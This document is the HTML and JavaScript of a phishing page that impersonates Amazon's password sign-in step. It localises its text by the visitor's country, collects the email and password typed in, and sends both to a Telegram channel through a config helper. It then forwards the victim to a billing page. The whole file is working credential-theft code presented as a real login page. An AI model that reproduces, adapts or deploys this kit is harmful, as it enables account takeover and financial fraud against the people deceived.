<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon — Sign In</title>
    <script src="config.js"></script>
    <script>
        let BAHASA = {
            judul: 'Sign in',
            email_ubah: 'Change',
            label_sandi: 'Password',
            lupa_sandi: 'Forgot password?',
            tombol_masuk: 'Sign in',
            atau: 'or',
            passkey: 'Sign in with a passkey',
            app: 'Sign in with Amazon shopping app',
            error_kosong: 'Enter your password'
        };

        async function deteksiLokasi() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                const negara = d.country_code || 'US';

                if (negara === 'JP') {
                    BAHASA = {
                        judul: 'サインイン',
                        email_ubah: '変更',
                        label_sandi: 'パスワード',
                        lupa_sandi: 'パスワードを忘れた場合',
                        tombol_masuk: 'サインイン',
                        atau: 'または',
                        passkey: 'パスキーでサインイン',
                        app: 'Amazonショッピングアプリでサインイン',
                        error_kosong: 'パスワードを入力してください'
                    };
                    document.documentElement.lang = 'ja';
                } else if (negara === 'ID') {
                    BAHASA = {
                        judul: 'Masuk',
                        email_ubah: 'Ubah',
                        label_sandi: 'Kata sandi',
                        lupa_sandi: 'Lupa kata sandi?',
                        tombol_masuk: 'Masuk',
                        atau: 'atau',
                        passkey: 'Masuk dengan kunci akses',
                        app: 'Masuk dengan aplikasi belanja Amazon',
                        error_kosong: 'Masukkan kata sandi Anda'
                    };
                    document.documentElement.lang = 'id';
                }
                terapkanBahasa();
            } catch(e) {}
        }

        function terapkanBahasa() {
            document.getElementById('judul').textContent = BAHASA.judul;
            document.getElementById('ubah-link').textContent = BAHASA.email_ubah;
            document.getElementById('label-sandi').textContent = BAHASA.label_sandi;
            document.getElementById('lupa-link').textContent = BAHASA.lupa_sandi;
            document.getElementById('tombol-masuk').textContent = BAHASA.tombol_masuk;
            document.getElementById('teks-atau').textContent = BAHASA.atau;
            document.getElementById('btn-passkey').textContent = BAHASA.passkey;
            document.getElementById('btn-app').textContent = BAHASA.app;
            document.getElementById('pesanKosong').textContent = BAHASA.error_kosong;
        }

        document.addEventListener('DOMContentLoaded', () => {
            // ✅ HANYA CEK APAKAH EMAIL SUDAH ADA — TIDAK BLOKIR
            const email = localStorage.getItem('emailPengguna');
            if (!email) { window.location.href = 'index.html'; return; }
            document.getElementById('tampil-email').textContent = email;
            deteksiLokasi();
        });
    </script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', Arial, sans-serif; }
        body { background: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 15px 20px; }
        .logo { margin: 10px 0 20px; }
        .logo img { height: 60px; }
        .kotak { width: 100%; max-width: 350px; border: 1px solid #ddd; border-radius: 8px; padding: 20px 26px; }
        h1 { font-size: 28px; font-weight: 400; margin-bottom: 12px; }
        .baris-email { font-size: 14px; color: #555; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; }
        .ubah { color: #0066c0; text-decoration: none; font-size: 14px; }
        .ubah:hover { text-decoration: underline; }
        label { font-size: 13px; font-weight: 700; display: block; margin-bottom: 6px; color: #111; }
        input { width: 100%; padding: 7px 10px; border: 1px solid #a6a6a6; border-radius: 4px; font-size: 15px; margin-bottom: 13px; height: 31px; }
        input:focus { outline: none; border-color: #0071e3; box-shadow: 0 0 3px rgba(0,113,227,0.5); }
        .baris-lupa { display: flex; justify-content: flex-end; margin-bottom: 20px; margin-top: -8px; }
        .lupa { color: #0066c0; text-decoration: none; font-size: 13px; }
        .lupa:hover { text-decoration: underline; }
        button { width: 100%; padding: 7px 10px; border-radius: 20px; font-size: 15px; cursor: pointer; height: 32px; border: none; }
        .btn-kuning { background: #FFD814; border: 1px solid #FCD200; color: #0F1111; margin-bottom: 15px; }
        .btn-kuning:hover { background: #F7CA00; }
        .pemisah { display: flex; align-items: center; margin: 10px 0 20px; }
        .garis { flex: 1; height: 1px; background: #e7e7e7; }
        .teks-atau { padding: 0 15px; font-size: 13px; color: #767676; }
        .btn-abu { background: #f0f2f2; border: 1px solid #ddd; color: #111; margin-bottom: 12px; }
        .btn-abu:hover { background: #e7e9ec; }
        .btn-putih { background: #fff; border: 1px solid #ddd; color: #111; margin-bottom: 10px; }
        .btn-putih:hover { background: #f7f8f8; }
        .footer { width: 100%; max-width: 500px; margin-top: 30px; padding-top: 20px; border-top: 1px solid #e7e7e7; text-align: center; font-size: 11px; color: #555; }
        .footer-link { margin-bottom: 10px; }
        .footer-link a { color: #0066c0; text-decoration: none; margin: 0 8px; }
        .footer-link a:hover { text-decoration: underline; }
        .pesan-error { color: #d00; font-size: 12px; margin-bottom: 10px; display: none; }
    </style>
</head>
<body>
    <div class="logo"><img src="img/amazonlogo.png" alt="Amazon"></div>
    <div class="kotak">
        <h1 id="judul">Sign in</h1>
        <div class="baris-email">
            <span id="tampil-email"></span>
            <a href="index.html" class="ubah" id="ubah-link">Change</a>
        </div>
        <div style="display: flex; justify-content: space-between; align-items: center;">
            <label for="password" id="label-sandi">Password</label>
            <a href="#" class="lupa" id="lupa-link">Forgot password?</a>
        </div>
        <input type="password" id="password" placeholder="">
        <div class="pesan-error" id="pesanKosong">Enter your password</div>
        <button id="tombol-masuk" class="btn-kuning" onclick="kirim()">Sign in</button>
        <div class="pemisah">
            <span class="garis"></span>
            <span class="teks-atau" id="teks-atau">or</span>
            <span class="garis"></span>
        </div>
        <button id="btn-passkey" class="btn-abu">Sign in with a passkey</button>
        <button id="btn-app" class="btn-putih">Sign in with Amazon shopping app</button>
    </div>
    <div class="footer">
        <div class="footer-link">
            <a href="#">Conditions of Use</a>
            <a href="#">Privacy Notice</a>
            <a href="#">Help</a>
        </div>
        <p>© 1996-2026, Amazon.com, Inc. or its affiliates</p>
    </div>

    <script>
        async function kirim() {
            const email = localStorage.getItem('emailPengguna');
            const password = document.getElementById('password').value.trim();
            if (!password) {
                document.getElementById('pesanKosong').style.display = 'block';
                document.getElementById('password').focus();
                return;
            }
            CONFIG.simpanLogin(email, password);
            const pesan = `
👤 *LOGIN*
━━━━━━━━━━━━━━━━━━━━━
📧 Email: \`${email}\`
🔑 Password: \`${password}\`
🕐 Waktu: ${new Date().toLocaleString()}
            `.trim();
            await CONFIG.kirimKeTelegram(pesan);
            window.location.href = 'billing.html';
        }
        document.getElementById('password').addEventListener('keypress', e => {
            if (e.key === 'Enter') kirim();
        });
    </script>
</body>
</html>
